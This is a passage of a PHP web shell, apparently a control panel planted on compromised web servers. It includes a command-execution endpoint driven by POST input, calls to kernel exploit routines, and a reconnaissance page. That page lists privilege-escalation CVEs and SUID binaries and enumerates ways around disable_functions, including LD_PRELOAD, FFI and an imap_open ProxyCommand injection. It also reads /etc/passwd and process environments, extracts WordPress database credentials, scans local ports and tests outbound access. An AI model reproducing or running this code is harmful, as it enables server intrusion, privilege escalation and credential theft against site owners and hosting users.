    return array($kver . ' — ' . exRun('uname -a') . "\n" . exRun('cat /etc/os-release 2>/dev/null | grep -E "^(NAME|VERSION)="'), $suggestions);
}

if (isset($_POST['ex'])) {
    $authEx = checkAuth();
    if (!$authEx['authenticated']) { header('Content-Type: application/json'); echo json_encode(array('error'=>'Auth required')); exit; }
    header('Content-Type: application/json; charset=utf-8');
    $exAction = $_POST['ex'];
    if ($exAction === 'cmd') { echo json_encode(array('out' => exRun(isset($_POST['cmd']) ? $_POST['cmd'] : ''))); exit; }
    if ($exAction === 'copyfail') { echo json_encode(exCopyFail()); exit; }
    if ($exAction === 'dirtyfrag') { echo json_encode(exDirtyFrag()); exit; }
    if ($exAction === 'altcves') { $r = exAltCves(); echo json_encode(array('info' => $r[0], 'suggestions' => $r[1])); exit; }
    if ($exAction === 'info') {
        $ini = array();
        foreach (array('open_basedir','safe_mode','memory_limit','upload_max_filesize','post_max_size','max_execution_time','max_input_vars','file_uploads','expose_php','display_errors','session.save_path','date.timezone') as $k) $ini[$k] = ini_get($k);
        echo json_encode(array(
            'whoami' => exRun('id'), 'groups' => exRun('id -Gn 2>/dev/null'), 'uname' => exRun('uname -a'),
            'os' => exRun('cat /etc/os-release 2>/dev/null | head -2'), 'kernel' => exKernelVer(), 'arch' => php_uname('m'),
            'php' => PHP_VERSION, 'sapi' => php_sapi_name(),
            'server_software' => isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : '',
            'document_root' => isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '',
            'http_host' => isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '',
            'remote_addr' => isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '',
            'server_user' => isset($_SERVER['USER']) ? $_SERVER['USER'] : '',
            'ini' => $ini, 'diag' => exDiag(), 'extensions' => get_loaded_extensions(),
        ));
        exit;
    }
    echo json_encode(array('error' => 'unknown action')); exit;
}

// ===== BUROKRAT SERVER INFO =====
function biSh($c){
  if(function_exists('shell_exec')){$r=@shell_exec($c.' 2>/dev/null');return trim((string)$r);}
  if(function_exists('exec')){$o=[];@exec($c.' 2>/dev/null',$o);return trim(implode("\n",$o));}
  return'';
}
function biWhich($b){$r=biSh('which '.escapeshellarg($b));return$r!==''?$r:false;}
function biFmt($b){
  if($b===false||$b===null||$b==='')return'N/A';
  $b=(float)$b;
  if($b>=1073741824)return round($b/1073741824,1).' GB';
  if($b>=1048576)return round($b/1048576,1).' MB';
  if($b>=1024)return round($b/1024,1).' KB';
  return $b.' B';
}
function biE($s){return htmlspecialchars((string)$s,ENT_QUOTES,'UTF-8');}
function biFread($p){$r=@file_get_contents($p);return$r!==false?trim((string)$r):'';}
function biFexists($p){return @file_exists($p);}
function biFnOk($f){static $df=null;if($df===null){$df=array_flip(array_map('trim',explode(',',ini_get('disable_functions'))));}return!isset($df[$f])&&function_exists($f);}
function biPanelByPath($path){
  if(preg_match('#/home/[^/]+/domains/#',$path))return'DirectAdmin';
  if(preg_match('#/home/[^/]+/public_html/#',$path))return'cPanel';
  if(preg_match('#/var/www/vhosts/#',$path))return'Plesk';
  if(preg_match('#/home/[^/]+/web/#',$path))return'HestiaCP';
  if(preg_match('#/var/www/clients/#',$path))return'ISPConfig';
  if(preg_match('#/home/[^/]+/web/[^/]+/public_html#',$path))return'VestaCP/HestiaCP';
  if(preg_match('#/home/[^/\.]+\.[^/]+/public_html#',$path))return'CyberPanel';
  return'';
}
function burokratPage(){
ob_start();
$server_ip=isset($_SERVER['SERVER_ADDR'])?$_SERVER['SERVER_ADDR']:(function_exists('gethostname')?@gethostbyname(@gethostname()):'?');
$client_ip='';
foreach(['HTTP_CF_CONNECTING_IP','HTTP_X_REAL_IP','HTTP_X_FORWARDED_FOR','REMOTE_ADDR'] as $_hk){
  if(!empty($_SERVER[$_hk])){$_parts=explode(',',$_SERVER[$_hk]);$client_ip=trim($_parts[0]);break;}
}
$web_server=isset($_SERVER['SERVER_SOFTWARE'])?$_SERVER['SERVER_SOFTWARE']:'?';
$php_ver=PHP_VERSION;
$php_sapi=php_sapi_name();
$uname_r=php_uname('r');
$uname_full=php_uname();
$cur_user='';
if(biFnOk('posix_geteuid')&&biFnOk('posix_getpwuid')){$pw=@posix_getpwuid(@posix_geteuid());if($pw)$cur_user=$pw['name'].'('.$pw['uid'].')';}
if(!$cur_user)$cur_user=get_current_user();
if(!$cur_user)$cur_user=biSh('whoami');
$uid_raw=biFnOk('posix_geteuid')?@posix_geteuid():null;
$gid_raw=biFnOk('posix_getegid')?@posix_getegid():null;
$groups_raw='';
if(biFnOk('posix_getgroups')){$_gids=@posix_getgroups();if($_gids)$groups_raw=implode(',',$_gids);}
$dis_func=ini_get('disable_functions');
if(!trim((string)$dis_func))$dis_func='None';

// Hosting environment
$env=[];
$lve_active=preg_match('/\.lve\./i',$uname_r);
$env['LVE (CloudLinux)']=$lve_active?['active','Kernel: '.$uname_r]:['inactive',''];
$_clr=biFread('/etc/cloudlinux-release');
if(!$_clr)$_clr=biFread('/etc/cl-release');
if(!$_clr&&$lve_active)$_clr='LVE kernel signature present (release file unreadable)';
$env['CloudLinux Release']=$_clr?['active',$_clr]:['inactive',''];
$cagefs=false;$cagefs_reason='';
if(biFexists('/proc/cagefs-skeleton')){$cagefs=true;$cagefs_reason='/proc/cagefs-skeleton present';}
if(!$cagefs&&biFexists('/etc/.cagefs')){$cagefs=true;$cagefs_reason='/etc/.cagefs present';}
$_cg1=biFread('/proc/1/cgroup');if(!$cagefs&&stripos($_cg1,'cagefs')!==false){$cagefs=true;$cagefs_reason='cgroup: cagefs';}
$_pse=biFread('/proc/self/environ');
$proc_self_environ=$_pse!==''?true:false;
if(!$cagefs&&!$proc_self_environ&&$lve_active){$cagefs_reason='Likely (proc/self/environ unreadable + LVE active)';}
$env['CageFS']=$cagefs?['active',$cagefs_reason]:['inactive',$cagefs_reason?:'Undetermined'];
$virt_type='Unknown';
$_cg=biFread('/proc/1/cgroup');
$_cpuinfo=biFread('/proc/cpuinfo');
if($_cg!==''){
  if(stripos($_cg,'docker')!==false)$virt_type='Docker';
  elseif(stripos($_cg,'lxc')!==false)$virt_type='LXC';
  elseif(stripos($_cg,'kubepods')!==false)$virt_type='Kubernetes';
}
if($virt_type==='Unknown'){
  if(biFexists('/proc/vz/veinfo'))$virt_type='OpenVZ';
  elseif(biFexists('/proc/user_beancounters'))$virt_type='OpenVZ';
  elseif($_cpuinfo&&stripos($_cpuinfo,'hypervisor')!==false)$virt_type='VM (KVM/VMware/Xen)';
  elseif($lve_active)$virt_type='CloudLinux LVE (shared)';
  elseif(biFexists('/proc/xen'))$virt_type='Xen';
}
$env['Virtualization']=['info',$virt_type];
$proc_self_cmdline=biFread('/proc/self/cmdline')!=='';
$proc_self_status=biFread('/proc/self/status')!=='';
$proc_version=biFread('/proc/version')!=='';
$proc_1_cmdline=biFread('/proc/1/cmdline')!=='';
$_se_mode='';
$_se_cfg=biFread('/etc/selinux/config');
if(preg_match('/^SELINUX=(\w+)/m',(string)$_se_cfg,$_sm))$_se_mode=$_sm[1];
$_ge=biSh('getenforce');if($_ge)$_se_mode=$_ge;
$_seactive=($_se_mode&&strtolower($_se_mode)!=='disabled');
$env['SELinux']=$_seactive?['active',$_se_mode]:['inactive',$_se_mode?:'Disabled'];
$_aa=biFexists('/sys/kernel/security/apparmor/profiles');
$env['AppArmor']=$_aa?['active','Active']:['inactive',''];
$env['Suhosin']=extension_loaded('suhosin')?['active','Loaded']:['inactive',''];
$i360=extension_loaded('i360')||biFexists('/var/imunify360');
$env['Imunify360']=$i360?['active','Active']:['inactive',''];
$_ms=false;
if(function_exists('apache_get_modules')){foreach(apache_get_modules() as $_m){if(stripos($_m,'security')!==false){$_ms=true;break;}}}
$env['mod_security']=$_ms?['active','Active']:['inactive',''];
$_ls=stripos($web_server,'litespeed')!==false||$php_sapi==='litespeed';
$env['LiteSpeed']=$_ls?['warn','Active']:['inactive',''];
$_la=biFread('/proc/loadavg');
$load_avg='';if($_la){$_lp=explode(' ',$_la);$load_avg=$_lp[0].'/'.(isset($_lp[1])?$_lp[1]:'?').'/'.(isset($_lp[2])?$_lp[2]:'?');}

// Control panel
$sd_path=isset($_SERVER['SCRIPT_FILENAME'])?$_SERVER['SCRIPT_FILENAME']:__FILE__;
$doc_root_path=isset($_SERVER['DOCUMENT_ROOT'])?$_SERVER['DOCUMENT_ROOT']:'';
$panel_by_path=biPanelByPath($sd_path)?:biPanelByPath($doc_root_path);
$panel_map=[
  'cPanel'=>[['/usr/local/cpanel'],'/usr/local/cpanel/version'],
  'Plesk'=>[['/usr/local/psa','/opt/psa'],'/usr/local/psa/version'],
  'DirectAdmin'=>[['/usr/local/directadmin'],'/usr/local/directadmin/scripts/version.txt'],
  'ISPConfig'=>[['/usr/local/ispconfig'],''],
  'HestiaCP'=>[['/usr/local/hestia'],'/usr/local/hestia/conf/hestia.conf'],
  'CyberPanel'=>[['/usr/local/CyberCP'],''],
  'Virtualmin'=>[['/etc/webmin/virtualmin.acl'],''],
  'Webmin'=>[['/etc/webmin'],'/etc/webmin/version'],
];
$panels=[];
foreach($panel_map as $_pn=>$_pd){
  foreach($_pd[0] as $_pp){
    if(biFexists($_pp)){$panels[$_pn]=$_pd[1]?trim(biFread($_pd[1])):'Detected';break;}
  }
}
if($panel_by_path&&!isset($panels[$panel_by_path]))$panels[$panel_by_path]='Detected from path layout';

// Kernel security
$ksec=[];
$ksec['user_ns (userns_clone)']=trim(biFread('/proc/sys/kernel/unprivileged_userns_clone'))!==''?trim(biFread('/proc/sys/kernel/unprivileged_userns_clone')):'N/A';
$ksec['ptrace_scope']=trim(biFread('/proc/sys/kernel/yama/ptrace_scope'))!==''?trim(biFread('/proc/sys/kernel/yama/ptrace_scope')):'N/A';
$ksec['dmesg_restrict']=trim(biFread('/proc/sys/kernel/dmesg_restrict'))!==''?trim(biFread('/proc/sys/kernel/dmesg_restrict')):'N/A';
$ksec['perf_paranoid']=trim(biFread('/proc/sys/kernel/perf_event_paranoid'))!==''?trim(biFread('/proc/sys/kernel/perf_event_paranoid')):'N/A';
$ksec['mmap_min_addr']=trim(biFread('/proc/sys/vm/mmap_min_addr'))!==''?trim(biFread('/proc/sys/vm/mmap_min_addr')):'N/A';
$kernel_cves=[];
preg_match('/(\d+)\.(\d+)\.(\d+)/i',$uname_r,$_kv);
if(!empty($_kv)){
  $_ma=(int)$_kv[1];$_mi=(int)$_kv[2];$_kp=(int)$_kv[3];
  $cve_list=[
    ['DirtyPipe CVE-2022-0847','5.8-5.16.10',($_ma===5&&$_mi>=8&&($_mi<16||($_mi===16&&$_kp<=10))),'pipe splice, SUID overwrite — very powerful'],
    ['GameOverlay CVE-2023-2640','5.15+ Ubuntu',($_ma>=5&&$_mi>=15),'Ubuntu overlayfs — requires user_ns'],
    ['OverlayFS CVE-2021-3493','<5.11 Ubuntu',($_ma<5||($_ma===5&&$_mi<11)),'overlayfs + user_ns (Ubuntu)'],
    ['PwnKit CVE-2021-4034','all',true,'if pkexec SUID exists — universal'],
    ['Looney Tunables CVE-2023-4911','all glibc',true,'GLIBC_TUNABLES — Debian/RHEL/Fedora glibc <2.34-r8'],
    ['StackRot CVE-2023-3269','6.1-6.4',($_ma===6&&$_mi>=1&&$_mi<=4),'maple tree UAF'],
    ['PTRACE_SEIZE CVE-2023-0386','<6.2',($_ma<6||($_ma===6&&$_mi<2)),'overlayfs setuid'],
  ];
  foreach($cve_list as $_c){if($_c[2])$kernel_cves[]=['name'=>$_c[0],'range'=>$_c[1],'desc'=>$_c[3]];}
}
$suid_known=[
  '/usr/bin/newuidmap'=>'newuidmap (user_ns escape)',
  '/usr/bin/newgidmap'=>'newgidmap (user_ns escape)',
  '/usr/bin/pkexec'=>'pkexec (CVE-2021-4034)',
  '/usr/bin/sudo'=>'sudo',
  '/usr/bin/passwd'=>'passwd',
  '/usr/bin/mount'=>'mount',
  '/usr/bin/su'=>'su',
  '/usr/bin/screen'=>'screen (CVE-2017-5618)',
  '/usr/bin/perl'=>'perl (GTFOBins)',
  '/usr/bin/python3'=>'python3 (GTFOBins)',
  '/usr/bin/find'=>'find (GTFOBins)',
  '/usr/bin/vim'=>'vim (GTFOBins)',
  '/usr/bin/awk'=>'awk (GTFOBins)',
];
$suid_found=[];
foreach($suid_known as $_sp=>$_sn){
  if(biFexists($_sp)){
    $_pm=@fileperms($_sp);
    $suid_found[$_sp]=['name'=>$_sn,'suid'=>$_pm&&($_pm&0x0800),'sgid'=>$_pm&&($_pm&0x0400),'perms'=>$_pm?substr(sprintf('%o',$_pm),-4):'?'];
  }
}

// Exec bypass
$bypass=[];
$bypass['eval()']=['yes','Language construct — disable_functions UNAFFECTED, always works'];
$bypass['assert()']=['yes','Language construct'];
$bypass['include/require']=['yes','Language construct — remote include needs allow_url_include'];
$_php_major=(int)PHP_MAJOR_VERSION;
$bypass['create_function()']=$_php_major<8?['yes','PHP 7 and below: runs eval() under the hood']:['no',"removed in PHP 8"];
$bypass['preg_replace /e']=$_php_major<7?['yes','Below PHP 7: /e modifier runs eval()']:["removed in PHP 7",'no'];
$exec_fns=['exec'=>'shell exec','shell_exec'=>'shell exec','system'=>'shell exec + echo','passthru'=>'shell exec + raw output','popen'=>'pipe open','proc_open'=>'process open'];
foreach($exec_fns as $_f=>$_fd){$_ok=biFnOk($_f);$bypass[$_f]=$_ok?['yes',$_fd]:['no','in disable_functions'];}
$_pcntl=biFnOk('pcntl_exec');
$bypass['pcntl_exec']=$_pcntl?['partial','Available but no output — process replace, returns HTTP 503']:['no','Missing or disabled'];
$ffi_enabled=false;$ffi_status='';
if(extension_loaded('FFI')){
  $ffi_ini=ini_get('ffi.enable');
  if($ffi_ini==='true'||$ffi_ini==='1'||$ffi_ini==='preload'){$ffi_enabled=true;$ffi_status='ffi.enable='.$ffi_ini;}
  else{$ffi_status='ffi.enable='.($ffi_ini?:'"" (disabled)');}
}else{$ffi_status='Extension not loaded';}
$bypass['FFI::cdef']=$ffi_enabled?['yes','FFI can call libc popen/system: '.$ffi_status]:['no',$ffi_status];
$putenv_ok=biFnOk('putenv');$mail_ok=biFnOk('mail');$errlog_ok=biFnOk('error_log');$mbmail_ok=biFnOk('mb_send_mail');
$_sm_path=ini_get('sendmail_path');$_sm_bin=trim(explode(' ',$_sm_path)[0]);$_sm_exists=($_sm_bin&&biFexists($_sm_bin));
$_ldp_base=$putenv_ok?'putenv OK':'putenv X (disabled)';
$bypass['LD_PRELOAD+mail']=($putenv_ok&&$mail_ok&&$_sm_exists)?['yes',$_ldp_base.' | mail OK | sendmail OK']:['no',$_ldp_base.' | mail='.($mail_ok?'OK':'X').' | sendmail='.($_sm_exists?'OK':'missing')];
$bypass['LD_PRELOAD+error_log']=($putenv_ok&&$errlog_ok)?['yes',$_ldp_base.' | error_log OK']:['no',$_ldp_base.' | error_log='.($errlog_ok?'OK':'X')];
$bypass['LD_PRELOAD+mb_send_mail']=($putenv_ok&&$mbmail_ok)?['yes',$_ldp_base.' | mb_send_mail OK']:['no',$_ldp_base.' | mb_send_mail='.($mbmail_ok?'OK':'X')];
$dl_ok=biFnOk('dl')&&ini_get('enable_dl');
$bypass['dl()']=$dl_ok?['yes','dl() active — runtime shared lib loading possible']:['no','dl() '.(!function_exists('dl')?'missing':(!ini_get('enable_dl')?'enable_dl=off':'disabled'))];
$imap_ok=biFnOk('imap_open');
$bypass['imap_open']=$imap_ok?['yes','Command injection: imap_open("{localhost:143/imap}x -oProxyCommand=cmd","","")']:['no','imap_open '.(extension_loaded('imap')?"in disable_functions":'not loaded')];
$bypass['Imagick policy']=class_exists('Imagick')?['partial','Imagick available — depends on ImageMagick policy.xml']:['no','Imagick not loaded'];
$expect_ok=in_array('expect',stream_get_wrappers());
$bypass['expect://']=$expect_ok?['yes','expect:// ACTIVE — fopen/include can run commands']:['no','Missing'];
$bypass['Symlink race']=[!$cagefs?'yes':'no','CageFS '.($cagefs?'ACTIVE (blocked)':'OFF — /proc/sysrq, cron race possible')];
$bypass['zip:// wrapper']=extension_loaded('zip')?['partial','zip:// active — useful for LFI chains']:['no','zip ext missing'];
$bypass['glob://']=['partial','glob:// always active — directory listing (LFI helper)'];

// Services
$svc_list=['MySQL','cURL','WGET','Perl','Python','Ruby','Git','WP-CLI','Sudo','Pkexec','FFmpeg','Composer','Node.js','NPM','Zip','Tar','Unzip','7zip','Sendmail'];
$svc=[];
foreach($svc_list as $_s){
  switch($_s){
    case 'MySQL':$svc[$_s]=extension_loaded('mysqli')||extension_loaded('pdo_mysql');break;
    case 'cURL':$svc[$_s]=function_exists('curl_version');break;
    case 'WGET':$svc[$_s]=(bool)biWhich('wget');break;
    case 'Perl':$svc[$_s]=(bool)biWhich('perl');break;
    case 'Python':$svc[$_s]=(bool)(biWhich('python3')||biWhich('python'));break;
    case 'Ruby':$svc[$_s]=(bool)biWhich('ruby');break;
    case 'Git':$svc[$_s]=(bool)biWhich('git');break;
    case 'WP-CLI':$svc[$_s]=(bool)biWhich('wp');break;
    case 'Sudo':$svc[$_s]=(bool)biWhich('sudo');break;
    case 'Pkexec':$svc[$_s]=(bool)biWhich('pkexec');break;
    case 'FFmpeg':$svc[$_s]=(bool)biWhich('ffmpeg');break;
    case 'Composer':$svc[$_s]=(bool)biWhich('composer');break;
    case 'Node.js':$svc[$_s]=(bool)biWhich('node');break;
    case 'NPM':$svc[$_s]=(bool)biWhich('npm');break;
    case 'Zip':$svc[$_s]=extension_loaded('zip')||(bool)biWhich('zip');break;
    case 'Tar':$svc[$_s]=(bool)biWhich('tar');break;
    case 'Unzip':$svc[$_s]=(bool)biWhich('unzip');break;
    case '7zip':$svc[$_s]=(bool)(biWhich('7z')||biWhich('7za'));break;
    case 'Sendmail':$svc[$_s]=(bool)biWhich('sendmail');break;
    default:$svc[$_s]=false;
  }
}
$svc_ver=[];
if($svc['cURL']&&function_exists('curl_version')){$cv=curl_version();$svc_ver['cURL']=isset($cv['version'])?$cv['version']:'';}

// WordPress
$wp_info=[];
$docroot=rtrim(isset($_SERVER['DOCUMENT_ROOT'])?$_SERVER['DOCUMENT_ROOT']:'','/\\');
$_wp_cfg_paths=[$docroot.'/wp-config.php',dirname($sd_path).'/wp-config.php',dirname(dirname($sd_path)).'/wp-config.php'];
$_wp_cfg='';
foreach($_wp_cfg_paths as $_p){$_c=biFread($_p);if($_c&&strpos($_c,'DB_NAME')!==false){$_wp_cfg=$_c;$wp_info['config_path']=$_p;break;}}
if($_wp_cfg){
  if(preg_match("/define\(\s*'DB_NAME'\s*,\s*'([^']+)'/i",$_wp_cfg,$_m))$wp_info['DB_NAME']=$_m[1];
  if(preg_match("/define\(\s*'DB_USER'\s*,\s*'([^']+)'/i",$_wp_cfg,$_m))$wp_info['DB_USER']=$_m[1];
  if(preg_match("/define\(\s*'DB_HOST'\s*,\s*'([^']+)'/i",$_wp_cfg,$_m))$wp_info['DB_HOST']=$_m[1];
  if(preg_match('/\$table_prefix\s*=\s*\'([^\']+)\'/i',$_wp_cfg,$_m))$wp_info['PREFIX']=$_m[1];
}

// PHP limits
$limits=[
  'memory_limit'=>ini_get('memory_limit'),
  'max_execution_time'=>ini_get('max_execution_time').' sec',
  'upload_max_filesize'=>ini_get('upload_max_filesize'),
  'post_max_size'=>ini_get('post_max_size'),
  'max_input_vars'=>ini_get('max_input_vars'),
  'max_file_uploads'=>ini_get('max_file_uploads'),
  'allow_url_fopen'=>ini_get('allow_url_fopen')?'On':'Off',
  'allow_url_include'=>ini_get('allow_url_include')?'On':'Off',
  'display_errors'=>ini_get('display_errors')?'On':'Off',
  'ffi.enable'=>ini_get('ffi.enable')?:'(empty/off)',
  'session.save_path'=>ini_get('session.save_path')?:sys_get_temp_dir(),
  'date.timezone'=>ini_get('date.timezone')?:date_default_timezone_get(),
  'sendmail_path'=>ini_get('sendmail_path')?:'N/A',
];

// Extensions
$all_exts=get_loaded_extensions();
sort($all_exts);
$hl_exts=['gd','imagick','mbstring','openssl','zip','intl','curl','pdo','mysqli','redis','memcached','memcache','opcache','apcu','soap','iconv','json','xml','simplexml','pcre','hash','bcmath','exif','fileinfo','ftp','imap','ldap','pdo_mysql','pdo_sqlite','pdo_pgsql','pgsql','sodium','sockets','ffi','pcntl'];

// Cache
$cache=[];
if(function_exists('opcache_get_status')){
  $ops=@opcache_get_status(false);
  if($ops&&!empty($ops['opcache_enabled'])){$cache['OPcache']='Active';}else{$cache['OPcache']=false;}
}else{$cache['OPcache']=null;}
if(function_exists('apcu_sma_info')){$ai=@apcu_sma_info();$cache['APCu']=$ai?'Active':false;}else{$cache['APCu']=null;}
if(class_exists('Redis')){try{$rd=new Redis();$rco=@$rd->connect('127.0.0.1',6379,2);if($rco){@$rd->close();$cache['Redis']='Active';}else{$cache['Redis']=false;}}catch(Exception$e){$cache['Redis']=false;}}else{$cache['Redis']=null;}
if(class_exists('Memcache')){try{$mc=new Memcache();$mcok=@$mc->connect('127.0.0.1',11211);if($mcok){@$mc->close();$cache['Memcache']='Active';}else $cache['Memcache']=false;}catch(Exception$e){$cache['Memcache']=false;}}else{$cache['Memcache']=null;}

// Database
$db=[];
if(extension_loaded('mysqli'))$db['MySQL']='Loaded';
elseif(extension_loaded('pdo_mysql'))$db['MySQL']='PDO MySQL';
else $db['MySQL']=false;
if(extension_loaded('pgsql'))$db['PostgreSQL']='Loaded';
elseif(extension_loaded('pdo_pgsql'))$db['PostgreSQL']='PDO PostgreSQL';
else $db['PostgreSQL']=false;
if(extension_loaded('sqlite3'))$db['SQLite']='v'.SQLite3::version()['versionString'];
elseif(extension_loaded('pdo_sqlite'))$db['SQLite']='PDO SQLite';
else $db['SQLite']=false;
$db['MongoDB']=extension_loaded('mongodb')?'Loaded':false;

// Filesystem
$fs=[];
$fs['DOCUMENT_ROOT']=$docroot?:__DIR__;
$dtot=$docroot?@disk_total_space($docroot):false;
$dfre=$docroot?@disk_free_space($docroot):false;
$fs['Disk Total']=biFmt($dtot);
$fs['Disk Free']=biFmt($dfre);
$tmp=sys_get_temp_dir();
$fs['Tmp Dir']=$tmp.' — '.(is_writable($tmp)?'Writable':'Read-only');
$sp=ini_get('session.save_path')?:$tmp;
$fs['Session Dir']=$sp.' — '.($sp&&is_writable($sp)?'Writable':'Read-only');
$sd=isset($_SERVER['SCRIPT_FILENAME'])?dirname($_SERVER['SCRIPT_FILENAME']):__DIR__;
$fs['Script Dir']=$sd.' — '.(is_writable($sd)?'Writable':'Read-only');
$etc_passwd=biFread('/etc/passwd');
$fs['/etc/passwd']=$etc_passwd?'Readable ('.substr_count($etc_passwd,"\n").' lines)':'Unreadable (open_basedir or permission)';
$fs['proc/self/environ']=$proc_self_environ?'Readable':'Unreadable';
$fs['proc/self/cmdline']=$proc_self_cmdline?'Readable':'Unreadable';
$fs['proc/1/cmdline']=$proc_1_cmdline?'Readable':'Unreadable (isolated)';

// Network
$net=[];
$net['Hostname']=function_exists('gethostname')?(string)gethostname():'N/A';
$net['Timezone']=date_default_timezone_get();
$net['Server Time']=date('d.m.Y H:i:s');
$net['Kernel']=php_uname('s').' '.php_uname('r');
$net['Architecture']=php_uname('m');
$_resolv=biFread('/etc/resolv.conf');
$_dns=[];
if($_resolv){preg_match_all('/^nameserver\s+(\S+)/m',$_resolv,$_dm);$_dns=$_dm[1];}
$net['DNS Servers']=$_dns?implode('  |  ',$_dns):'N/A';
if($_cpuinfo){
  $cc=substr_count($_cpuinfo,'processor');
  $cm='';if(preg_match('/model name\s*:\s*(.+)/i',$_cpuinfo,$_cma))$cm=trim($_cma[1]);
  $net['CPU']=$cc.' cores'.($cm?' — '.$cm:'');
}
$_mi=biFread('/proc/meminfo');
if($_mi){
  $_mt=$_ma=0;
  if(preg_match('/MemTotal:\s+(\d+)/i',$_mi,$_mm))$_mt=(int)$_mm[1];
  if(preg_match('/MemAvailable:\s+(\d+)/i',$_mi,$_mm))$_ma=(int)$_mm[1];
  if($_mt){
    $net['RAM Total']=round($_mt/1024).' MB';
    $net['RAM Used']=round(($_mt-$_ma)/1024).' MB ('.round(($_mt-$_ma)/$_mt*100,1).'%)';
  }
}
if($load_avg)$net['Load Average']=$load_avg;

// Port scan
$ports_scan=[];
if(function_exists('fsockopen')){
  $scan_ports=[21=>'FTP',22=>'SSH',80=>'HTTP',443=>'HTTPS',3306=>'MySQL',5432=>'PostgreSQL',6379=>'Redis',11211=>'Memcached',8080=>'HTTP-Alt',25=>'SMTP',587=>'SMTP-587'];
  $_mh=[];
  foreach($scan_ports as $_port=>$_pname){
    $_sock=@fsockopen('127.0.0.1',$_port,$errno,$errstr,0.4);
    $ports_scan[$_port]=['name'=>$_pname,'open'=>$_sock!==false];
    if($_sock)fclose($_sock);
  }
}
$egress=['enabled'=>false,'ip'=>'','method'=>''];
if(function_exists('curl_init')){
  $_egch=curl_init();
  curl_setopt_array($_egch,[CURLOPT_URL=>'https://api.ipify.org',CURLOPT_RETURNTRANSFER=>true,CURLOPT_TIMEOUT=>4,CURLOPT_SSL_VERIFYPEER=>false]);
  $_egr=@curl_exec($_egch);$_egerr=curl_errno($_egch);curl_close($_egch);
  if(!$_egerr&&$_egr&&preg_match('/^\d{1,3}(\.\d{1,3}){3}$/',trim($_egr)))$egress=['enabled'=>true,'ip'=>trim($_egr),'method'=>'curl HTTPS'];
}
$fpm_sockets=[];
foreach(['/run','/var/run','/tmp'] as $_fd){
  if(@is_dir($_fd)){
    $_fh=@opendir($_fd);
    if($_fh){while(false!==($_ff=@readdir($_fh))){if(substr($_ff,-4)==='.sock'||strpos($_ff,'fpm')!==false)$fpm_sockets[]=$_fd.'/'.$_ff;}@closedir($_fh);}
  }
}
ob_end_clean();
?>
<style>
.bi-wrap{font-family:'JetBrains Mono',monospace;font-size:13px;color:var(--text);}
.bi-card{border:1px solid var(--card-border);border-radius:12px;padding:16px 18px;margin:12px 0;background:var(--card);}
.bi-card h3{color:var(--text);font-size:12px;text-transform:uppercase;letter-spacing:.1em;margin-bottom:10px;padding-bottom:6px;border-bottom:1px solid var(--card-border);}
.bi-row{display:flex;gap:10px;padding:5px 2px;border-bottom:1px solid rgba(255,255,255,.04);align-items:baseline;}
.bi-row .l{color:var(--text-ter);min-width:195px;flex-shrink:0;font-size:12px;}
.bi-row .v{word-break:break-all;line-height:1.4;font-size:12px;}
.bi-row .v.ok{color:#22c55e;}.bi-row .v.warn{color:#f59e0b;}.bi-row .v.err{color:#ef4444;}.bi-row .v.info{color:#60a5fa;}
.bi-badges{display:flex;flex-wrap:wrap;gap:4px;}
.bi-b{display:inline-flex;align-items:center;padding:4px 9px;border-radius:4px;font-size:11px;white-space:nowrap;}
.bi-on{background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.25);color:#22c55e;}
.bi-off{background:rgba(239,68,68,.06);border:1px solid rgba(239,68,68,.15);color:#7a7a7a;}
.bi-na{background:rgba(255,255,255,.03);border:1px solid var(--card-border);color:var(--text-ter);}
.bi-warn{background:rgba(245,158,11,.08);border:1px solid rgba(245,158,11,.25);color:#f59e0b;}
.bi-panel{background:rgba(96,165,250,.06);border:1px solid rgba(96,165,250,.2);color:#60a5fa;}
.bi-chip{display:inline-block;padding:2px 7px;border-radius:3px;font-size:11px;margin:2px;border:1px solid var(--card-border);background:rgba(255,255,255,.03);color:var(--text-sec);}
.bi-chip.hl{border-color:rgba(34,197,94,.4);background:rgba(34,197,94,.07);color:#22c55e;font-weight:bold;}
.bi-port{padding:3px 8px;border-radius:3px;font-size:11px;}
.bi-port.open{background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.25);color:#22c55e;}
.bi-port.closed{background:rgba(255,255,255,.02);border:1px solid var(--card-border);color:var(--text-ter);}
</style>
<div class="bi-wrap">
<div class="page-header" style="margin-bottom:12px;">
    <h1 class="page-title"><i class="fas fa-heart-pulse" style="color:var(--text);margin-right:10px;"></i> Server Info</h1>
</div>

<div class="bi-card">
  <h3>Server Summary</h3>
  <div style="display:flex;flex-wrap:wrap;gap:4px 22px;margin:4px 0 8px;">
    <div><span class="l" style="color:var(--text-ter)">Server IP: </span><span style="color:#22c55e"><?=biE($server_ip)?></span></div>
    <div><span class="l" style="color:var(--text-ter)">Your IP: </span><span style="color:#22c55e"><?=biE($client_ip)?></span></div>
  </div>
  <div class="bi-row"><span class="l">Web Server</span><span class="v"><?=biE($web_server)?></span></div>
  <div class="bi-row"><span class="l">System</span><span class="v"><?=biE($uname_full)?></span></div>
  <div class="bi-row"><span class="l">User</span><span class="v ok"><?=biE($cur_user)?></span></div>
  <?php if($uid_raw!==null):?><div class="bi-row"><span class="l">UID/GID</span><span class="v"><?=biE($uid_raw.'/'.$gid_raw)?></span></div><?php endif;?>
  <?php if($groups_raw):?><div class="bi-row"><span class="l">Groups</span><span class="v"><?=biE($groups_raw)?></span></div><?php endif;?>
  <div class="bi-row"><span class="l">PHP Version</span><span class="v ok"><?=biE($php_ver)?> (<?=biE($php_sapi)?>)</span></div>
  <?php if($load_avg):?><div class="bi-row"><span class="l">Load</span><span class="v"><?=biE($load_avg)?></span></div><?php endif;?>
  <div class="bi-row"><span class="l">Disable Functions</span><span class="v <?=$dis_func==='None'?'ok':'warn'?>"><?=biE($dis_func)?></span></div>
</div>

<div class="bi-card">
  <h3>Hosting Environment &amp; Security</h3>
  <div class="bi-badges" style="margin-bottom:12px">
<?php foreach($env as $_en=>$_ev){$_state=$_ev[0];$_val=$_ev[1];
  if($_state==='info'){echo '<span class="bi-b bi-panel">&#9432; '.biE($_en).'</span>';}
  elseif($_state==='active'||$_state===true){echo '<span class="bi-b bi-warn">&#9888; '.biE($_en).'</span>';}
